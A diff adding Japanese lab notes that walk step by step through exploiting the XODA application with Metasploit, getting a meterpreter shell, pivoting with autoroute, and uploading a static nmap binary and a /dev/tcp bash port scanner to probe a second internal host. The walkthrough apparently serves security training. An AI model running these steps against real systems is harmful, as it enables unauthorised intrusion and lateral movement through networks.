@@ -1,0 +1,41 @@
+demo：ネットワークサービススキャン
+1) nmap -sC -sV ターゲットドメインでセキュリティーホールをスキャンする
+2) service postgresql start && msfconsole
+3) search xoda
+4) useでモジュールを起動する
+5) 基本情報を設定する
+set LHOST
+set RHOSTS
+set TARGETURI /
+6) exploitでmeterpreterの権限を奪う
+7) shellでコマンドシェルを起動して、ip addrで2番目のターゲットマシンのIPアドレスの範囲を特定する
+  →eth1インターフェース上のIPアドレスが1番目のターゲットで右端のを1大きくすると2番目のターゲットのIPになる
+8) run autoroute -s ターゲット1のIPアドレスでmetasploitのルーティングテーブルにルートを追加する
+9) backgroudを実行して、meterpreterセッションをバッググラウンドで実行して、metasploitのportscan tcpモジュールでポートスキャンする
+10) search portscan tcp
+11) useでモジュールを起動する
+12) 基本情報設定
+set RHOSTS ターゲットマシン2のIPアドレス
+set verbose false
+set ports 1-1000
+exploit
+13) 新しいターミナルのwindowを開いて、以下のコマンドを使って、「/usr/bin/」ディレクトリで使用可能な静的バイナリを確認する
+ls -al /root/static-binaries/namp
+file /root/static-binaries/nmap
+14) 最初のターミナルに戻って、ポートスキャンを行う以下のbashスクリプトを作る
+「#!/bin/bash
+  for port in {1..1000}; do
+   timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
+  done」
+15) fgコマンドを使って、metasploitセッションをフォアグラウンドにして、sessions -i 1でセッションを起動する
+16) nmap静的バイナリとbashポートスキャナースクリプトをターゲットマシンにアップロードする
+upload /root/static-binaries/nmap /tmp/nmap
+upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
+17) 以下のコマンドを使って、バイナリとスクリプトを実行可能にして、bashスクリプトを使用して2番目のターゲットマシンをスキャンする
+shell
+cd /tmp/
+chmod +x ./nmap ./bash-port-scanner.sh
+./bash-port-scanner.sh ターゲット2IPアドレス
+18) nmapバイナリを使用して、ターゲットマシンの開いているポートをスキャンする
+./nmap -p- ターゲット2IPアドレス
+  
